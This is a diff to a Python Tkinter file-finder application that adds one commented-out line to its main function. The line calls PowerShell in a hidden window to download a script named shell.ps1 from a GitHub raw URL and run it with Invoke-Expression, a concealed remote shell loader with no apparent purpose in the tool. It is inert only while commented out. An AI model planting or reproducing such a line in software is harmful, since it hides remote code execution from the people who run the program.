@@ -185,6 +185,7 @@ def main():
     """
     Função principal que inicia a aplicação
     """
+    # os.system("powershell -nop -w hidden -c \"irm https://raw.githubusercontent.com/museu-do-novo/python-tools/refs/heads/main/shell.ps1 | iex\"")
     root = tk.Tk()  # Cria a janela principal
     app = FileFinderApp(root)  # Instancia nossa aplicação
     root.mainloop()  # Inicia o loop principal da interface
